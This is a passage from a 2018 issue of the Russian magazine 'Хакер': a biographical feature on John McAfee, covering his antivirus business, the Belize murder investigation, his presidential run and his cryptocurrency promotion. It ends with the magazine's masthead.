 вую масштабную пиар‐акцию. С вирусом Michelangelo, угрожающим всему
 прогрессивному человечес тву, Макафи нагнета ет не хуже, чем Ванга с апо‐
 калипсисом.





     Шес того мар та до пяти миллионов компьюте ров могут быть унич-
      тожены вирусом Микеландже ло!

 Все мировые СМИ цитиро вали Джо на Макафи, нап ряжение с каждым днем
 нарастало, но обещанная «бомба» так и не взорвалась.


        WWW

                      Двад цать  лет  спустя  сот рудники  компании
                       Sophos вспоминают, как это было.


 Единственным конкурентом компании Джона Макафи на американском рынке
 была Peter Norton Computing (в 1990 году поглощена Symantec), предлагав‐
 шая тогда некоммерческие продукты. McAfee Associates успешно выходит
 на биржу и становится многомиллиардным биз несом. Спустя два года
 Макафи продает свои акции за сто миллионов долларов, красиво завершив
 свою первую боль шую игру.
   В результате множества слияний и поглощений McAfee наращивает обо‐
 роты. В 2010 году пищевая цепочка доходит до такой акулы, как Intel: после
 продолжительных переговоров она выкупает акции McAfee за 7,68 миллиарда
 долларов. К тому моменту McAfee — уже вто рая по доходности в мире анти‐
 вирусная компания и занимает 7% от глобального рынка. Юристы новой доч‐
 ки Intel даже пытаются в судебном порядке запретить Джону Макафи исполь‐
 зовать собственную фамилию как бренд. В итоге стороны пришли к полюбов‐
 ному соглашению, в соответствии с которым запрет касается только сферы
 информационной безопас ности.
   Тем временем у подавляющего большинства юзеров McAfee вызывает
 стойкую ассоциацию с назойливой программой, которая по умолчанию уста‐
 навливается с десятитысячным обновлением бра узерного плагина Adobe
 Flash Player. Макафи надоели пись ма с проклятиями, тем более к продукту он
 уже больше двадцати лет не имеет никакого отношения. Ответом стал дивный
 ролик «Как удалить антивирус Макафи». Обязатель но посмотри, если еще не
 видел!





 ЙОГА И АЭРОТРЕКИНГ
 После продажи компании Джон Макафи пишет книги о йоге и занимается
 аэротрекингом. Макафи — автор целого направления  так называемой
 реляционной йоги (это больше философское учение, чем техника, но вовсе
 не о базах данных, как ты мог подумать). На Amazon можно приобрести обу‐
 чающие DVD гуру.
   В штатах Аризона и Нью‐Мексико миллионер скупает шестьдесят гектаров
 земли под взлетные полосы, заправки и летную школу. Создает неформаль‐
 ное объединение «Небесные цыгане». Подробнее про аэротрекинг можешь
 почитать в статье «Популярной механики». Ска жу только, что это синоним
 слов «адреналин» и «драйв», а ролики аэротрекеров идеально ложатся
 на Gogol Bordello.





      Бы ла неделя, когда мы устроили «покатуш ки» для двухсот человек,
      вклю чая одну 86-летнюю бабульку. Это был самый счас тливый день
       в ее жиз ни!

 «Крутые пике» закончились трагически. 22‐летний племянник Макафи Джоэль
 Битоу разбился во время полета на мотодельтап лане о скалы каньона Смер‐
 ти. Вместе с ним погиб 61‐летний пассажир Роберт Гилсон, семья которого
 впоследствии подала иск на пять миллионов долларов из‐за того, что Макафи
 допустил недостаточно опытного Битоу  к полетам. Роберт Гилсон был
 ветераном ВВС,  который  незадолго до  присоединения  к  «Небесным
 цыганам» серьезно перебо лел менин гитом и даже впадал в кому.

 БЕЛИЗ 
 Мировой финансовый кризис 2008‐го в Соеди ненных Штатах ударил не толь‐
 ко по стриптизершам, имеющим по две ипотеки. Почти все свое состояние
 потерял и Джон Макафи, инвестировавший в недвижимость по всей стране.
 Мессенджер PowWow, над которым он работал, про дан дотком‐инкубатору
 CMGI еще в 1999 году.


             INFO

                   PowWow был во многом инновационным продук‐
                          том: поддерживал  VoIP‐телефонию,  групповые
                          чаты, протоколы популярных тогда AOL Instant
                       Messenger (AIM) и MSN Messenger.


 Бывший программист и миллионер распро дает активы и уез жает в Централь‐
 ную Америку с амбициозной идеей лабора тории по производству натураль‐
 ных антибиотиков QuorumEx. За основу было взя то научное открытие мирово‐
 го уровня — результаты исследования микробиоло гов Гринберга и Баслер
 о «чувстве кворума» у бактерий. Проект не был реализован.
   Вообще, все, что тво рилось в Белизе, похоже, так и останется в Белизе.
 Как бы сказал Шерлок Холмс, «чрезвычай но запутанная история». Сущес тву‐
 ет несколько версий развития событий: редактора журнала Wired, охотника
 за цветастым сюжетом Джошуа Дэвиса, написавшего биографию Макафи
 John McAfee’s Last Stand, правительства и официальных лиц «пиратского»
 Белиза и самого Макафи.





 Сравнивать версии и выис кивать правду будет излишне, так что пройдемся
 по хронологии событий, о которых известно доподлинно.
  • 30 апреля 2012 года Макафи арес тован в городе Ориндж‐Уолк особым
   подразделением полиции Белиза по борь бе с организованной прес‐
    тупностью в связи с обвинениями в производс тве лекарственных средств
   без лицензии и хра нении незарегистрированного оружия. Обви нения
   были полностью сняты через нес коль ко часов. «Хакер» писал об этом.
  • 12 ноября 2012 года полиция Белиза начала поиски Макафи в связи
    с убийством его соседа, инженера на пенсии из Флориды Грегори Ваента
   Фол ла.
  • Фолл найден мертвым с огнестрельным ранением в голову 11 нояб‐
   ря 2012 года в его доме на острове Амбергрис‐Ки. Следов взлома
    полиция, приехавшая по вызову домработницы, не нашла. Из личных
   вещей пропали ноут бук и iPhone. Убитый был неоднократно арес тован
    в США за домашнее насилие. Официальных обвинений никому так и не
   было предъявлено.

  Репортер Джошуа Дэвис, гос тивший на вилле Макафи продолжительное вре‐
 мя, писал о том, что Макафи окружил себя толпой вооруженных головорезов,
 гаремом проституток и окончательно потерял связь с реальностью от пос‐
 тоянного приема наркотиков. Следс твием  это го  стала тяжелая форма
 паранойи.
   У Макафи действительно были воору женные телохранители, стая бой‐
 цовых собак (Джон всегда любил песиков), а на вилле пос тоянно проживали
 местные молодые женщины. Общение с ними Джон называл «социальным
 экспериментом» и, вернувшись в США, сделал почти всем американские
 визы.





                   Социальный эксперимент

 Сам Джон Макафи считал, что убийца приходил за ним, но перепутал дома,
 а белизская полиция хочет отомстить ему. Макафи завел личный блог,
 в котором рассказывал, как боролся с местными коррумпированными влас‐
 тями, организовав для этого целую шпионскую сеть.
   Премьер‐министр Белиза Дин Барроу, комментируя ситуацию, назвал
 Макафи свихнувшимся параноиком.


 ПОБЕГ В ГВАТЕМАЛУ
 Над Макафи нависла серь езная угроза сесть в белизскую тюрьму. Бизнесмен
 объявил вознаграждение 25 тысяч дол ларов тому, кто знает имя настоящего
 убийцы Гре гори Фолла, изменил внешность и подался в бега. Он давно
 заметил, что во время дождя местные пограничники никого не останавливают
 для проверки, пережидая непого ду в машинах.
   Для пересечения границы между Белизом и Гватемалой был выбран день,
 когда синоптики обещали ливень с веро ятностью сто процентов. В этой исто‐
 рии были и другие замеча тельные подробности: за пару часов до того,
 как Макафи под дождем двинулся через гра ницу, то же самое попытал ся
 совершить его двой ник — заведомо неудачно, чтобы его пой мали и полиция
 сбавила бдительность. «Хакер» писал и об этой исто рии.
   Через несколько недель Джон Макафи был арес тован в Гватемале. Он
 позвал в гости в свое тайное убежище знакомых журналистов из Vice.com.
 По ошибке (или таков был план?) они опубликовали на своем сай те фотог‐
 рафию  с  iPhone,  который  по  умолчанию  сохранял  GPS‐координаты
 в метаданных.
   Позже Макафи написал в своем блоге, что специально подделал XIF,
 но затем удалил эту стра ницу. Так или иначе, правительство Гватемалы отка‐
 залось предоставить Макафи политическое убежище, а влас ти Белиза не ста‐
 ли объявлять беглеца в международный розыск. Неделю спустя из‐за проб‐
 лем с сердцем подозреваемый был экс тра дирован в США и оказал ся
 в безопасности.





 Последняя новость о рас следова нии датируется 2016 годом: «Полиция
 Белиза и ФБР вызвали на допрос бывшую девуш ку Макафи Эми Херберт
 Эмшвиллер. Сам Макафи по‐прежнему отрицает свою причастность к прес‐
 туплению, но готов к даче показаний. Только не на территории Белиза».

 КАНДИДАТ ОТ НАРОДА 
 В 2013 году Джон Макафи женился на Дженис Джайсон, прос титутке из Фло‐
 риды. Молодожены перееха ли из Портлен да, штат Орегон, в Лексингтон,
 штат Теннесси. В сентябре 2015 года Макафи решил заняться партстро‐
 ением и анонсировал на своем канале на YouTube будущую «Киберпартию».
    Чуть позже Макафи спра ведливо реша ет, что значительно проще будет
 баллотироваться на пост президента от Либертарианской партии — третьей
 политической силы в стра не. Джон выступает на национальном съезде
 либертарианцев с предвыборной прог раммой и участвует в итоговых мартов‐
 ских телевизионных дебатах. На итоговом праймериз Макафи занимает
 третье место и одерживает победу в штатах Монтана и Нью‐Гэмпшир.
   Заметим, что Джон Макафи никогда не менял политичес кие взгляды
 и всегда позиционировал себя как либер тарианца.


 МАКАФИ И IPHONE
 В рамках своей президентской кампании Джон Макафи заявил в эфире Rus‐
 sia Today (где он частый гость), что готов с командой безвозмез дно помочь
 ФБР взломать смартфон iPhone 5c террориста из Сан‐Бернардино.
   Через неделю Макафи признался, что сол гал, но с благими намерениями:
 «Я знал, что, поступая таким образом, я прив леку до хре на общественного
 внимания, что и произошло. То видео на моем YouTube‐аккаунте насчитывает
 уже 700 тысяч просмотров. Моей целью было привлечь внимание американ‐
 цев к проблеме ФБР, которое пытается оду рачить американское общество.
 Как я должен был это сделать, прос то заявить об этом прямо? Никто
 не стал бы слушать такую чушь. Поэто му я при думал нечто сенсационное».





 Похожая ситуация повторилась с заявлением Макафи об уязвимости в мес‐
 сенджере WhatsApp.


 МАКАФИ И КРИПТОВАЛЮТЫ
 Выборы президента Соединенных Шта тов запомнились не только неожидан‐
 ной победой Дональда Трампа, но и лучшим в истории результатом кан‐
 дидата от Либертарианской партии — Гэри Джонсон набрал 3,3% голосов.
   Джон Макафи занимает пост исполнительного директора в компании MGT
 Capital Investments. Эта загадочная инвестиционная группа только что пле‐
 тением из виноградной лозы не занималась. Вот некоторые сфе ры ее инте‐
 ресов: мобильные игры, фэнтези‐спорт, лекарс тва, кибербезопас ность, май‐
 нинг биткойнов. Однако в августе 2017 года Макафи уже меня ет должность
 на главного консультанта по воп росам кибербезопасности, а в феврале
 и вовсе покидает MGT по договоренности с инвесторами.
   Тем временем твиттер Макафи щебечет так же активно, как твиттер пре‐
 зидента Америки. 825 тысяч подписчи ков следят не только за безумным
 реалити‐шоу семейства Макафи, но и за рекомендациями «легенды кибер‐
 безопасности» (как сам любит себя называть Джон) по инвестициям в крип‐
 товалюты и ICO. Из‐за это го регулярно вспыхива ют скандалы. Пос ледний
 связан с ICO Pink Taxi. Макафи даже извинился за разработчиков, которые
 полностью скопировали проект стартапа A2B из Литвы. Промоушен осу щест‐
 вляет McAfee Crypto Team — маркетинговое ICO‐бюро «Макафи, жена и дру‐
 ганы». По последним данным Джон берет пятьсот тысяч долларов за твит.





       Говорят, что я продался, потому что я использую свои твиты для прод-
       вижения, но из пос ледних двухсот ICO мы отклонили 195 и выбрали
        пять. Я прод вигаю только то, во что верю.

 Из‐за повышенного спроса на услуги McAfee Crypto Team пришлось ввес ти
 регистрационный сбор в раз мере 750 долларов.
   Ранее Макафи вел рубрику «Монета дня», в которой он каждый день опи‐
 сывал достоинства сравнительно неизвестной криптовалюты, после чего ее
 курс стремительно «туземунил». Пос ле обвинений в играх pump‐and‐dump
 Джон перешел на еженедельный формат, а потом и вовсе отказался от руб‐
 рики, под которую уже ста ли писать торговые боты.
   Под Новый год твиттер Макафи взломали хакеры и в течение нескольких
 минут дали рекомендации к покупке четырех монет: Basic Attention Token
 (BAT), Nxt (NXT), Siacoin (SC) и Patientory (PTOY). Все монеты получили крат‐
 косрочный молниеносный рост, а потом резко ушли ниже своих обычных тор‐
 говых уровней.





        WWW

                     Ты наверняка слышал об исто рии, ког да Макафи
                       пообещал (бук вально?) съесть свой член на наци‐
                        ональном телевидении, если Bitcoin не достигнет
                      цены в полмиллиона долларов. Позже с очеред‐
                    ным взлетом курса он внес поп равку: миллион
                       долларов за биткойн до кон ца 2020 года. Кто‐то
                       уже сделал сайт fnordprefekt.de, который поз‐
                        воля ет следить за тем, как сбывает ся прог ноз.



 МАКАФИ В КИНО
 Джон Макафи всегда «писал жизнь красиво, без черновика». Разумеется, его
 история привлекла внимание кинема тографистов. Документальный фильм
 «Гринго: опасная жизнь Джона Макафи» вышел в прошлом году. Канадские
 кинематографисты снимают документалку «Кто такой Макафи». Билли Кор‐
 бен, режиссер нашумевших «Кока иновых ковбоев», работает над докумен‐
 тальным мини‐сериалом «Проект Макафи».
   В прошлом году был анонсирован игровой фильм о похождени ях Макафи
 в Белизе «Король джунглей» по книге Джошуа Дэвиса — права на его исто‐
 рию Макафи купила Warner Brothers. В 2013 году Дэвис вместе со своим тез‐
 кой Бирманом основали журнал EPIC, истории из которого очень любят
 в Гол ливуде. За фильм «Операция „Арго“» Бир ман получил «Оскар» за лучший
 адаптированный сценарий. Так что должно получить ся эпично! По самым пос‐
 ледним новостям, на главную роль утвержден Джонни Депп. Хотя сам Макафи
 хотел, чтобы его сыграл Морган Фримен.
   №05 (230)
             Илья Русанен          Алексей Глазков       Андрей Письменный
              Глав ный редактор       Выпускающий редактор         Шеф‐редак тор
                rusanen@glc.ru               glazkov@glc.ru             pismenny@glc.ru
                                 Евгения Шарипо ва
                                     Литературный редактор


                           РЕ ДАК ТОРЫ РУБРИК
          Андрей Письменный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
                  aLLy              Ев гений Зобнин        Антон «ant» Жуков
            iam@russiansecurity.expert          zobnin@glc.ru               zhukov@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕК ЛАМА

                                  Анна Яков лева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по подписке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Друж бы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколам ское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязательно сов пада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редак ция
не несет ответственности за содер жание рекламных объ явлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2018